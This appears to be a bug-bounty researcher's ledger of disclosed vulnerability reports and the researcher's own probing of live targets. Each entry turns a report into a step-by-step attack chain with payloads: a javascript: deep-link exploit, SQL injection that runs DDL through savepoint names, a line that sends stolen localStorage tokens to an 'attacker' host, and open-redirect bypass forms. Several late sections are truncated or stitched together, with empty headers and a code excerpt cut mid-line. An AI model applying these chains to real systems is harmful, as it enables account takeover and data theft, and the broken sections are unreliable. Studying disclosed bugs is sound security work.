### §INTAKE-2026-11-22/1 — A PROCESS-STATIC HEADER MAP IS A CREDENTIAL CARRIER ACROSS ORIGINS: THE WEBVIEW'S COOKIE IS WRITTEN INTO A FIELD THAT OUTLIVES THE PAGE, SO THE NEXT URL LOAD (ATTACKER'S) RECEIVES IT

SOURCE: https://hackerone.com/reports/3475626 (LinkedIn Android — "Session Cookie Leakage via Static Header Field in WebViewerFragment", High CVSS 8.1, disclosed 2026-03-17)  read 2026-11-22
ROUTE: live `https://hackerone.com/reports/3475626.json` — `visibility: full`, `vulnerability_information` 10,330 B read IN FULL (decompiled Java, the deep-link validator, the JS-interface chain, the full PoC link).
STATUS: UNVERIFIED (not reproduced — no Android device/APK exercised this pass).
CLASS: credential bleed through process-scoped mutable state in an embedded browser (CWE-200 / CWE-668) — a `static` field holds request headers between navigations, so cookies fetched for origin A are attached to origin B.
CORE METHOD (as the report states it):
  1. Find the WebView loading routine and read what it puts on the request. Here: `loadUrl(Uri)` → if `shouldUseCookies`, `CookieManager.getCookie(url)` → `WebViewerFragment.CUSTOM_HEADERS.put("Cookie", s)` → `webView.loadUrl(s, CUSTOM_HEADERS)`.
  2. The map is `static` and NEVER cleared. Load a site with cookies (the app's own domain) and the cookie string is now resident in that field; load a second URL that has no cookies of its own and the stale `Cookie` header is still set — `webView.loadUrl` sends A's cookies to B.
  3. Reach the fragment from outside, because no deep link targets it directly. Leg 1: the verification WebView is openable via `https://www.linkedin.com/trust/verification?verificationUrl=<url>` and validates the HOST against a whitelist but NOT the scheme — `javascript://www.linkedin.com/%0aalert(1)` passes, since `getHost()` is still `www.linkedin.com`.
  4. Leg 2, the parameter the app appends: the handler runs `appendQueryParameter("renderContext","trustVerificationDeeplink")` on the payload, which breaks naive JS. Neutralise it with a fragment-closed string: `javascript://www.linkedin.com/%0aalert('1#')` becomes `…alert('1?renderContext=trustVerificationDeeplink#')` — valid JavaScript, appended text swallowed by the string.
  5. Leg 3, escape the WebView: the page gets a `@JavascriptInterface` named `Android` exposing `sendWebMessage(String)`; posting `{"additionalWebViewUrl":"https://www.linkedin.com"}` flows to `_receiveWebMessageLiveData` → `WebViewerBundle.create(url)` → `launchWebViewer`.
  6. Leg 4, force the VULNERABLE client. `LinkedInUrlRequestInterceptor` picks `web_viewer` only when `isLinkedInUrl(u) || isLinkedInArticleUrl(u)`; the article pattern `(http|https)://www.linkedin(-ei)?.com/pulse/+` has NO `^` anchor, so appending `http://www.linkedin.com/pulse/1` to ANY url makes `find()` succeed and the fragment is chosen.
  7. Sequence in one payload: (a) `sendWebMessage` → `https://www.linkedin.com/…` (cookies land in `CUSTOM_HEADERS`), (b) after a delay, `sendWebMessage` → `https://<attacker>/http://www.linkedin.com/pulse/1` — the attacker origin receives the `Cookie` header and its session tokens.
DETECTION SIGNAL: a `static`/singleton/`object`-scoped (not per-instance) map, interceptor, or header cache in a WebView/CEF/WebView2/Electron loading routine; `loadUrl(url, headers)` where headers are built from a field rather than locals; deep links whose validator checks `getHost()` but not `getScheme()`; a JS bridge that accepts a URL field (`additionalWebViewUrl`, `openUrl`, `navigate`) from page content; URL-classification regexes without `^`/`$` anchors.
CHAIN: victim taps one link (primitive: `javascript:` scheme survives a host-only deep-link check, fragment neuters the appended parameter) → JS in the verification WebView calls the bridge twice (primitive: the bridge opens an arbitrary `additionalWebViewUrl`) → an unanchored "is this our article" regex forces the vulnerable web-view client (primitive: client selection is content-dependent and forgeable) → the static header map carries the victim's session cookies to the attacker origin → full account takeover (CVSS 8.1 High).
TRANSFERABLE TEST: for every mobile/desktop app with an embedded browser, decompile/inspect the load path for a STATIC or singleton headers/cookie store; then drive it with two loads in one session (own domain, then a listener you control) and read the received `Cookie`/`Authorization` header. In parallel, feed the deep-link handler `javascript://<allowed-host>/%0aprint(1)` and a `?param` appending handler the `('1#')` trick, and try appending `https://<allowed-host>/<anypath>` to a non-allowlisted URL to defeat unanchored "internal URL" regexes. Rule: **per-request credentials must live in locals, never in a field that survives the request — and an "is this our URL" regex without `^` is an attacker-controlled client selector.**
DEDUPE/DELTA: `3475626`, `CUSTOM_HEADERS`, `WebViewerFragment`, "static field"/"header map", `additionalWebViewUrl` = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: the Electron/CEF loopback-WS RCE (ledger ~2499) and the `app.asar` source-read entry (~1144) are about the desktop shell's IPC surface; the recorded WebView material is URI-scheme/`javascript:` injection into a privileged bridge (ledger ~3114) and origin-decision-from-URL-string (~8203) — none records a process-global header/cookie store that carries CREDENTIALS from one origin to the next.
HONESTY: not reproduced; every code block, the deep-link shape and the full URL-encoded PoC link are verbatim from the fetched report body. The report's own step 5-6 outcome ("another WebView launches, cookies in the request to the collaborator host") is the author's verification, not mine.

### §INTAKE-2026-11-22/2 — VALIDATE ONE DOCUMENT, EXECUTE ANOTHER: A NESTED WRAPPER SELECTS THE MENU ITEM, THE TOP-LEVEL OBJECT DRIVES THE PARSER, AND `$id` REBASES A FRAGMENT-ONLY `$ref` INTO A LOCAL FILE

SOURCE: https://hackerone.com/reports/4000535 (PortSwigger / Burp Community — "Burp Community OpenAPI site-map action reads a local schema example through $id rebasing", Medium, $1,000, disclosed 2026-11-13)  read 2026-11-22
ROUTE: live `https://hackerone.com/reports/4000535.json` — `visibility: full`, `vulnerability_information` 7,029 B read IN FULL (root-cause list, controls, limits, JAR hashes).
STATUS: UNVERIFIED (not reproduced — no Burp install exercised this pass; the report states UI reproduction on 2026.8 build 53343 and 2026.7.3 build 52685).
CLASS: local file read via a schema/definition loader's base-URI indirection (`$id`), amplified by a validator-vs-executor document-selection divergence (CWE-73 / CWE-918-adjacent, client-side).
CORE METHOD (as the report states it):
  1. Find a feature that ingests a document from a response and then ACTS on it ("Save OpenAPI requests to site map", import spec, preview, generate client). Two code paths touch the same bytes: a `validate()` that decides the action is available, and the click handler that `parse()`s.
  2. Measure the divergence. `validate()` unwraps a nested `swaggerDoc` (OpenAPI 3.0.0 → valid, menu item appears) while the click path parses the ORIGINAL top-level body (OpenAPI 3.1 object). The thing the user approves is not the thing that runs.
  3. Walk the SECURITY CHECK, not the spec: the external-reference guard scans `$ref` strings. A direct `{"$ref":"file:///…/secret"}` is rejected ("links to one or more external API definitions"); a fragment-only `{"$ref":"#/secret"}` is accepted — and the local base for that fragment comes from `$id: "file:///…/local-schema.json"`.
  4. The 3.1 resolver rebases the fragment against `$id`, reaches its file reader, and copies the selected `example` value into the generated request body — the value is now inside a request addressed to the definition's server.
  5. Exfiltration is a second user action (one Repeater send), so the report keeps it at Medium under the program's reduced-interaction category; controls confirm each leg: `$id`-without-fragment yields only the inline value, a top-level 3.1 object without the `swaggerDoc` bridge shows no menu item, direct external `$ref` is refused.
DETECTION SIGNAL: any importer/validator that offers an action based on document A and executes document B (wrapper unwrap, `swaggerDoc`/`openapi`/`schema` nesting, "any-of" version detection); a reference allowlist that inspects `$ref` but not base-URI carriers (`$id`, `xml:base`, `baseURI`, `@context`, `documentBase`); JSON-Schema/OpenAPI 3.1 support added later than 3.0 (older guard never updated); schema `example`/`default`/`enum` values flowing into generated requests.
CHAIN: attacker-controlled definition served to the tool (primitive: nested wrapper passes validation while a 3.1 root carries the payload) → `$id` sets a `file:///` base the external-reference check never sees (primitive: the guard scans the wrong node/keyword) → fragment-only `$ref` resolves against that base and the file reader opens a local JSON schema (primitive: local read) → a chosen `example` value is copied into a generated request to the attacker's server (escalation: read becomes exfil on the user's next send) → internal endpoint examples, sample credentials, tokens, tenant ids. Medium when it needs an explicit send; High in any product that auto-fetches references or logs generated requests server-side.
TRANSFERABLE TEST: on every "load spec/schema/config from a URL" feature, send ONE response containing both a nested 3.0 `swaggerDoc` (so the UI offers the action) and a top-level 3.1 object whose `$id` is `file:///etc/hostname` with `$ref: "#/<field>"` — then compare what the validator said with what the executor opened. Also probe `xml:base`, `$schema`, `baseURI`, `@context` and `definitions` wrappers for the same indirection. Rule: **a security check that scans references must ALSO constrain the base they resolve against; and whenever validation and execution pick different nodes from the same document, the difference is the vulnerability.**
DEDUPE/DELTA: `4000535`, `$id rebasing`, `swaggerDoc`, `baseURI`-as-base = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: the Swagger-UI `configUrl=data:text/html` XSS (ledger ~2994) is script execution via a config URL, not a local file read; the ledger's LFI material covers traversal-shaped paths and PDF/HTML renderers (`file:///` in an iframe), not a SPEC-LOADER base-URI rebase; `$ref`/external-reference hits are OAuth/JWT `$ref`-free material.
HONESTY: not reproduced; the root-cause list (five numbered steps), the three controls and the two JAR hashes are verbatim from the report. The report explicitly bounds the read: known path, readable file, compatible schema shape, disclosure of a selected `example` — not an unrestricted raw read.

### §INTAKE-2026-11-22/3 — REVOCATION IS A DERIVED VALUE: A 403 THAT FLIPS BACK TO 200 WHEN AN UNRELATED PEER WRITES, BECAUSE AUTHORITY IS RE-MATERIALIZED FROM THE SYNC DOCUMENT, NOT THE TOKEN

SOURCE: https://hackerone.com/reports/3852102 (Vercel — "Revoked deployment collaborator regains access to private comments after active collaborator interaction", Medium CVSS 4.8, $1,026, disclosed 2026-10-29)  read 2026-11-22
ROUTE: live `https://hackerone.com/reports/3852102.json` — `visibility: full`, `vulnerability_information` 21,295 B read (summary, 8-step reproduction, full 403 and 200 request/response pairs).
STATUS: UNVERIFIED (not reproduced — no Vercel deployment exercised).
CLASS: broken access control — revocation enforced only on the token's own request path, while the authorization decision for the sync document is recomputed from the CURRENT collaborator set on somebody else's write (CWE-613 / CWE-863).
CORE METHOD (as the report states it):
  1. Establish the baseline of the sync endpoint: `POST /api/replicache/pull?docID=live_mode_1@prj_<id>@dpl_<id>` with the member's `authorization` header and a minimal body `{"profileID":"","clientID":"","cookie":{"version":1}}` (strip every other header; `cookie.version` is the client's pull cursor). Response = full private comment/message state for the deployment.
  2. Revoke the member. Replay the SAME request with the SAME retained token: `403 {"error":{"message":"Not authorized.","code":"unauthorized","statusCode":403}}`. Revocation works on this path.
  3. Have a DIFFERENT, still-active collaborator perform a normal toolbar interaction (open the toolbar, post one comment). That write bumps the document and re-authorizes the collaborator set for the doc.
  4. Replay the revoked member's untouched request again: `200 OK` with `lastMutationID`, a new `cookie.version` and the `patch[]` containing the comment threads, author names, message bodies and activity. No re-invite, no new token.
  5. The lesson is in the shape, not the product: the token was never re-validated; the SYNC LAYER restored permissions from cached membership when a peer's mutation forced it to recompute the document's ACL.
DETECTION SIGNAL: a collaboration/sync layer (Replicache, Yjs/Automerge, Liveblocks, Firebase/pocketbase-style doc sync, WebSocket "room" auth, CRDT servers) whose pull endpoint authorizes by DOCUMENT id from a cached/derived membership record; revocation implemented as "invalidate the token" (single-use or per-request check) while doc ACLs are cached and recomputed on writes; a 403 that becomes 2xx after third-party activity; `pullVersion`/`cookie.version`/`lastMutationID` cursors that a client controls.
CHAIN: an insider/contractor holds a valid deployment-scoped token (primitive: legitimate membership) → they are removed (control: their requests 403) → any remaining active member interacts, and the sync layer re-derives the document ACL from the surviving population's write (primitive: authorization state restored without a new grant) → the revoked token pulls the full private thread history (escalation: revocation is advisory; offboarding no longer removes read access) → continued exfiltration of internal comments/messages after termination. Medium as rated; High where the document carries credentials/PII or where the ex-member acts on write mutations.
TRANSFERABLE TEST: on any realtime/sync/collab product: (1) capture member A's pull/sync request, (2) remove A, confirm 403, (3) have member B perform ONE ordinary write in the same room/document, (4) replay A's exact request. Then repeat with A's token against a SECOND document A never had, to separate "revocation not applied" from "ACL recomputed from peer state". Rule: **removal must invalidate the membership record itself, not just the token — if authorization for a document is derived on a peer's write, revoking one member is undone by the next thing any other member does.**
DEDUPE/DELTA: `3852102`, `replicache`, `pullVersion`, `lastMutationID`, "revoked token regains access" = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: ledger ~5705/5769 (#386997 — membership revocation applied to the NAVIGATION layer, stale-object read re-evaluated never; that is "the check never runs", this is "the check runs, then is overwritten"); ~10075 (one-time promotion offer replay after revocation — a REPLAY of a mutation, no peer involvement); ~11121 (logout/revocation parameter missing — a token that never dies); §17.190-family connection-reuse entries (authority cached on a pooled connection). NEW atom: third-party-triggered re-materialization of an ACL for a token that was already denied.
HONESTY: not reproduced; the two HTTP exchanges (403 body, 200 body with `patch[]`) and the eight reproduction steps are quoted/paraphrased verbatim from the report body.

### §INTAKE-2026-11-22/4 — THE DRIVER'S QUOTING LAYER IS BROKEN TWICE: THE ESCAPER RE-ESCAPES ITS OWN OUTPUT (ODD BACKSLASH RUN EATS THE CLOSING QUOTE) AND THE CONNECT CALL FORCES MULTI-STATEMENTS, SO A SAVEPOINT NAME EXECUTES DDL

SOURCE: https://hackerone.com/reports/3890289 (MariaDB Connector/C++ — "string escaper re-escapes its own output, enabling SQL injection", Medium CVSS 6.9, disclosed 2026-11-04) and https://hackerone.com/reports/3890329 (same driver — "ignores allowMultiQueries and injects savepoint names into SQL", Medium CVSS 6.9, disclosed 2026-11-04)  read 2026-11-22
ROUTE: live `.json` on both reports — `visibility: full`, 24,919 B and 17,865 B read IN FULL (source excerpts, general-log output, payload-shape counts, negative controls).
STATUS: UNVERIFIED (not reproduced — no MariaDB 11.4 + connector build stood up this pass; both reports ship runnable PoCs with server general-log evidence).
CLASS: SQL injection inside a database driver's identifier/literal quoting layer (CWE-89), reachable from application-supplied table/schema/savepoint names.
CORE METHOD (as the reports state it):
  1. Read the escaper, not the app. `Utils::escapeString` = `replace(value,"'","''")` then, when backslash escapes are live, `replace(escaped,"\\","\\\\")` — both on `sql::mariadb::replace`.
  2. The replace loop is the bug: `prev += realSub.length();` instead of `prev = pos + realSub.length();`, so after each replacement the search cursor lands BEHIND the text it just inserted, re-finds its own output and escapes it again. Output length grows with the character's OFFSET: a backslash at index 5 emerges as SEVEN backslashes.
  3. Parity decides whether you have injection: quote-doubling is always even and survives the multiplication, backslash-doubling does not — one trailing live backslash consumes the literal's closing quote and the payload becomes code. Emitted statement (server general log): `… TABLE_NAME LIKE 'alpha\'''''''' OR 1=1 OR TABLE_NAME LIKE '''''…'`.
  4. Second, independent defect on the same path: three sibling metadata helpers disagree — `escapeQuote` passes the live `noBackslashEscapes` flag while `patternCond`/`schemaPatternCond` HARDCODE `true`, telling the escaper backslash is not an escape character; against a default server it never escapes it at all. Either defect alone injects (measured: stock 42/336 payload shapes inject; fixing only the flag leaves 36; fixing the loop leaves 0).
  5. Reachability: `getTables/getColumns/getPrimaryKeys/getProcedures/getFunctions/getColumnPrivileges/getTablePrivileges` and 14 `catalogCond` call sites, plus the driver's own public `quoteIdentifier`/`enquoteIdentifier` — so the "safe" API is also broken.
  6. Companion report, same layer: `ConnectProtocol::createConnection` COMPUTES the capability mask from `allowMultiQueries` and then throws it away, passing the literal `CLIENT_MULTI_STATEMENTS` at `:474`, so stacked statements are on even when the app set `allowMultiQueries=false`. And `setSavepoint(name)`/`releaseSavepoint` concatenate the name with no quoting at all (`"SAVEPOINT " + name`), so `setSavepoint("sp; CREATE TABLE canary_b (id INT); -- ")` emits `SAVEPOINT sp; CREATE TABLE …; -- 0` and the DDL runs.
DETECTION SIGNAL: a hand-rolled escape/replace helper used by a driver or DB abstraction (grep `replace(value,"'","''")`, `str_replace`, `String.replace` inside an escaper); a replace loop that advances a cursor by the SUBSTITUTION length rather than to the end of the inserted text; per-call-site flags hardcoded rather than read from the connection; an identifier path (`SAVEPOINT`, `SET ROLE`, `USE`, table/schema/column names in metadata queries) that does not call the driver's own quote helper; a connect call with a literal capability constant where a computed mask exists; `allowMultiQueries`/`MULTI_STATEMENTS` defaults.
CHAIN: any app that passes a user-visible label into a table/schema/column pattern or a savepoint name (tenant name, saved query name, report label — primitive: the driver quotes it) → the escaper's odd backslash run escapes the closing quote, or the name is concatenated raw while multi-statements are force-enabled → arbitrary SQL/DDL on the driver's own connection (escalation: cross-schema reads, then stacked `CREATE`/`INSERT`, then file/UDF primitives on a privileged account) → data exfiltration or server-side writes under the app's DB principal.
TRANSFERABLE TEST: for every DB driver/ORM in scope, (1) find the escaper and count its output for input ``a\`` at several offsets — an ODD backslash run means injection; (2) grep every identifier interpolation for the driver's quote helper; (3) call the identifier-taking API with `x; CREATE TABLE canary(id INT); -- ` and check the server's general log for a second statement; (4) connect with multi-statement support explicitly OFF, then submit one stacked statement. Rule: **the quoting layer of a driver is security-critical code with no test coverage — verify PARITY of its output, verify the capability mask actually reaches the connect call, and never accept "the driver escapes it" as a mitigation.**
DEDUPE/DELTA: `3890289`, `3890329`, `SAVEPOINT`, `savepoint`, `quoteIdent`, `realSub`/`replaceInternal`, `CLIENT_MULTI_STATEMENTS` = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: the MariaDB SERVER entries (`.frm` field-number OOB #3897914, cursor-array UAF, `unpack_fields` OOB #3896671, CONNECT file UDF gate #3836021) are engine-side memory/privilege bugs; the ledger's SQLi material covers app-level query building, WAF bypass and NoSQL operators — none records a DRIVER-SIDE escaper whose output is re-escaped, or a connect call that overrides the app's multi-statement opt-out.
HONESTY: not reproduced; the code excerpts (`String.cpp:64-76`, `Utils.cpp:66-81`, `ConnectProtocol.cpp:183/:474`, `MariaDbConnection.cpp:1093-1116`), the general-log lines, the 336-shape/4-build matrix and the `canary_a`/`canary_b` results are verbatim from the two report bodies. Precondition stated by the reports: the application must pass an untrusted name into a metadata call or a savepoint name.

### §INTAKE-2026-11-22/5 — A FIRST-PARTY REWRITE OF PERMISSIONLESS STORAGE IS SAME-ORIGIN HTML: `/raw/` SKIPS THE SANDBOX REDIRECT, `'self'` SATISFIES CSP, AND THE EXFIL RIDES THE NAVIGATION CSP CANNOT BLOCK

SOURCE: https://medium.com/@r3dd404/how-a-next-js-cdn-proxy-turned-into-a-one-click-account-takeover-dd8bc8dd9fde (R3DD, 2026-11-21, CVSS 9.3 Critical, program acknowledged same day)  read 2026-11-22
ROUTE: `web_extract` on the Medium article — full body (config excerpt, the `/raw/` discovery, CSP text, localStorage keys, exfil technique, impact).
STATUS: UNVERIFIED (not reproduced; the article documents one-click ATO and the vendor's fix).
CLASS: same-origin XSS via a reverse-proxy rewrite of attacker-writable storage (CWE-79 / CWE-1104), escalated to ATO by localStorage-held tokens.
CORE METHOD (as the article states it):
  1. Read the routing config, not the app: `next.config.ts` `rewrites()` proxied several CDNs — Cloudinary (images only, safe) plus `{source:'/cdn/arweave/:path*', destination:'https://arweave.net/:path*'}` and the IPFS equivalent. A rewrite is a reverse proxy: the response is served from the app's OWN origin, with its cookies and its localStorage.
  2. Classify each upstream by who can write to it. Arweave/IPFS/Filecoin are permissionless: anyone uploads any bytes, including `text/html` with JavaScript.
  3. Enumerate the upstream's access paths — the first attempt failed because `/cdn/arweave/<txid>` redirects to a sandboxed subdomain. Arweave also serves `/raw/<txid>`, which returns the bytes directly with no redirect → the HTML renders on the target origin. (Find existing HTML transactions through the storage network's own GraphQL index, filtered by `Content-Type: text/html`.)
  4. Check the CSP against that reality: `script-src 'self' 'unsafe-inline' 'unsafe-eval'` — `'self'` now includes the proxied document, and inline script is allowed, so inline JS executes and can pull further same-origin assets.
  5. Steal what the origin can reach: `auth:token` (JWT), `auth:refresh_token`, `auth:pat` in localStorage — no HttpOnly equivalent, readable by any same-origin script.
  6. Exfiltrate AROUND `connect-src`: fetch/XHR to an external host is blocked, but navigation is not — `window.location = 'https://attacker/?d=' + btoa(JSON.stringify(tokens))`, then the attacker 302s back so the victim notices nothing. Replay by setting the three localStorage keys in a clean browser and reloading.
  7. Amplifier: immutable storage means the payload cannot be taken down, and a later rollback that reintroduces the rewrite re-arms it instantly.
DETECTION SIGNAL: `rewrites()`, `vercel.json` rewrites, nginx `proxy_pass`, Apache `ProxyPass`, CloudFront/Cloudflare origin rules, or any `/cdn/`, `/proxy/`, `/img/`, `/embed/` route that maps to an EXTERNAL host; upstreams that are user-writable or permissionless (Arweave, IPFS, Filecoin, public S3/R2 buckets, pastebins, gist raw, user-submitted CDNs, `*.github.io`); proxied content served without `Content-Type: text/plain`/`Content-Disposition: attachment`; `unsafe-inline`/`'self'` where the "self" origin can host attacker bytes; auth tokens in `localStorage`.
CHAIN: attacker uploads one HTML page to permissionless storage (primitive: anyone can write the upstream) → the app's rewrite serves it from its own origin, via an endpoint variant that skips the sandbox redirect (primitive: same-origin script execution) → `'self'` + `'unsafe-inline'` let it run (primitive: CSP satisfied by construction) → localStorage tokens read → `window.location` navigation exfiltrates despite `connect-src` (escalation: token theft immune to the CSP directive that matters) → full ATO incl. PII, internal dashboards and payout-address changes, mass-exploitable with one click and a permanent payload (CVSS 9.3 Critical).
TRANSFERABLE TEST: dump every rewrite/proxy rule and classify each destination as attacker-writable; for each one, fetch `/cdn/<upstream>/<something-html>` and every sibling access path of that upstream (raw/direct/download/ipfs gateway variants) and check whether bytes are returned as `text/html` on the target origin; then read the CSP and confirm whether `'self'`/`unsafe-inline` makes the origin self-defeating, and whether tokens sit in localStorage. Rule: **proxying someone else's storage onto your origin imports their write policy as your XSS surface — check `/raw/`-style variants before declaring the sandbox safe, and remember `connect-src` never blocks a navigation.**
DEDUPE/DELTA: `cdn proxy`, "CDN proxy", `permissionless`, `arweave` = 0 hits across the three write targets. Recorded neighbours REVIEWED and NOT conflated: the ledger's `ipfs://` entries (curl `tool_ipfs.c` SSRF/traversal, ledger ~18358) and the IPFS/`IPFS_GATEWAY` hits are SSRF on a gateway URL; the recorded same-origin-proxy mention is an SSRF-adjacent line, not HTML execution; the Electron/open-redirect "loads attacker HTML" entries are desktop-shell RCE. NEW atoms: (a) a rewrite to a PERMISSIONLESS store = self-XSS-free stored XSS on your own origin, (b) the upstream's alternate access path defeating a sandbox redirect, (c) navigation-based exfil under a strict `connect-src`.
HONESTY: not reproduced; all quoted config, the CSP string, the three localStorage keys, the `/raw/` behaviour and the CVSS breakdown are verbatim from the article. The vendor acknowledgement is the author's statement (same-day Critical, rewrites removed).

### §INTAKE-2026-11-22/6 — `"null" === event.origin` IS A TRUST DECISION ANY PAGE CAN FORGE: AN EMPTY ALLOW-LIST PLUS A NAME-BASED DISPATCHER TURNS `postMessage` INTO `obj[methodName].apply(obj,args)`, AND ONE METHOD IS `scriptLoader.load(src)`

SOURCE: https://medium.com/@mahmoudfarag.rm4/postmessage-leads-to-one-click-account-takeover-87a401ca3a49 (Mahmoud Farag / RM4, 2026-11-19; third-party analytics SDK on two national news brands)  read 2026-11-22
ROUTE: `web_extract` on the Medium article — the listener source, the allow-list line, the dispatcher, the `scriptLoader` sink, the sandboxed-iframe PoC and the token replay.
STATUS: UNVERIFIED (not reproduced; the article documents one-click ATO against logged-in readers).
CLASS: DOM/`postMessage` injection → arbitrary script on the target origin → token theft (CWE-346 / CWE-79), via an opaque-origin trust bug in a third-party SDK.
CORE METHOD (as the article states it):
  1. Inventory client-side trust. List every `message` listener on in-scope pages and write down, per listener, what it checks and what it reaches. Start from the tag-manager container — it names every third party injected into the origin.
  2. Read the gate literally: `if ((!(s = t.origin) || "null" === s || s === window.location.origin || h.includes(s)) && (o = t.data) && "__MRF_SDK__" === o.app)`. Two flaws: an OPAQUE origin (`"null"`) is explicitly trusted, and the allow-list `h` is declared empty 2 KB earlier — so the "real" gate admits nothing and everything.

### §INTAKE-2026-11-22/7 — THE AUTHORIZATION TARGET IS TAKEN FROM THE URL, NOT THE SESSION: A DAV HANDLER OPENS `<userId>` FROM THE REQUEST PATH, AND THE 423 REFUSAL MAILS BACK THE LOCK TOKEN THAT RELEASES IT

SOURCE: https://hackerone.com/reports/3301553 (Nextcloud `files_lock` — "Cross-User Lock/Unlock via Absolute DAV Path", Medium 6.3, disclosed 2026-09-17)  read 2026-11-22

CLASS: broken access control / IDOR on a resource locator (CWE-639) — plus disclosure of the credential that releases the borrowed state.
CORE METHOD (as the report states it):

SOURCE: https://hackerone.com/reports/3876430 (MariaDB — "GRANT PROXY permits unauthorized authentication changes and administrator account takeover", High 8.x, CVE-2026-97380, disclosed 2026-09-07)  read 2026-11-22

### HUNT PASS 92 — cell K/L intake: the Azure APIM signup toggle

SOURCE (opened 2026-11-22): https://www.praetorian.com/blog/azure-apim-signup-bypass/ — "Azure APIM
Signup Bypass: 97.9% Still Exploitable", Praetorian, 2026-03-24; originating research M. Haatainen
(Bountyy Oy), GHSA-vcwf-73jp-r7mv, MSRC verdict "by design". STATUS: VERIFIED (page read in full; the
detector was then executed live, which is what makes this an intake rather than a bookmark).

MECHANISM: the developer-portal "disable signup" toggle is COSMETIC. `portalsettings/signup.enabled=false`
only hides the form; the REST endpoint behind it keeps accepting registrations, there is no tenant/origin
validation on the request, and the CAPTCHA service is shared across every APIM tenant (a challenge minted
on instance A validates on instance B). Attacker chain: register → confirm e-mail → subscribe to the
default Starter product (auto-approve) → receive a subscription key → call the backend APIs the portal
publishes.

DETECTOR (non-destructive, this is the reusable part): `POST /signup` with body `{}` on the
`*.developer.azure-api.net` host. Expected vulnerable answer:
`400 {"code":"ValidationError","message":"Signup Request validation error.","details":[{"target":"challenge"},{"target":"signupData","message":"Value cannot be null"}]}`.
The tell is the ERROR TARGET NAMES (challenge/signupData), not the status code. Controls that make the
verdict real: `GET /signup` → ordinary portal shell (toggle is set); `POST /signupzzq<rand>` → shell or 404;
`POST /developer/<anything>` → a DIFFERENT error class (`MissingOrIncorrectVersionParameter`, 301 B).

EXECUTED ON FIBA (in-scope asset, anonymous, no account created, no e-mail, no captcha solved): the 194-byte
ValidationError body appeared BYTE-IDENTICAL (sha 92434cd69403) on both
fiba-apim-service-prod and fiba-apim-service-partner-prod → the vulnerability is present in configuration on
both portals, and these are ~98% of portals per the vendor-independent measurement.

WHY IT WAS STILL NOT REPORTED — three independent reasons, recorded so nobody re-spends it:
 1. NO IMPACT PATH. `GET /developer/products?api-version=2022-04-01-preview` and `/developer/apis` return
    `{"value":[],"nextLink":null}` (28 B) on BOTH portals. No published product ⇒ no auto-approving
    subscription ⇒ no API key ⇒ no backend reach. The chain dies at "an account exists".
 2. PROGRAM-EXCLUDED. FIBA's scope text lists "Authentication bypass & broken authentication" under
    NON-QUALIFYING ("excluded here - unusual"). Even a completed chain is unpayable on this program.
 3. WRITE COST. Completing the chain needs a real registration + captcha replay; that is a write, needing
    sign-off, for a class the program will not pay for.
REUSABLE RULE: on any APIM estate whose policy DOES accept auth bypass and whose portal publishes at least
one product, this is a cheap Critical. The two gate questions come before the write, not after.

CORRECTION TO A PRIOR REGISTER ROW: p25 swept /developer/* WITHOUT `api-version` and concluded "400
MissingOrIncorrectVersionParameter ⇒ no new surface". With the documented `?api-version=2022-04-01-preview`
the lists really do answer — they are empty, not gated. The prior verdict was right for the wrong reason.

THE ALLOWLIST BUG THAT SURVIVES REVIEW. The app's only redirect guard (module 55801, live chunk

  l=["fiba.basketball","localhost","championsleague.basketball"],

The eTLD+1 logic is CORRECT for absolute URLs — https://evil.example/x, https://evil.example./x,
https://www.fiba.basketball.evil.example/x and a Cyrillic homoglyph `fibа.basketball` all collapse to the
hub. That is exactly why a code reviewer who tests absolute URLs passes it. But `startsWith("/")` returns
before the parse, so `//attacker/x`, `///attacker/x` and `//user:pw@attacker/x` are returned unvalidated and
the browser resolves them off-origin. Executed 20-input matrix (loop/p003rev2/D_reducer_bypass.json): 4
off-origin, controls hold for the backslash (`/\host` stays a path, NOT a bypass in modern browsers),
the percent-encoded (`%2f%2f` does not bypass after decoding) and the absolute forms.
TRANSFERABLE RULE: any "we validate the host" claim gets the protocol-relative form FIRST. It is a
one-request disproof of a control that looks sound in every review.
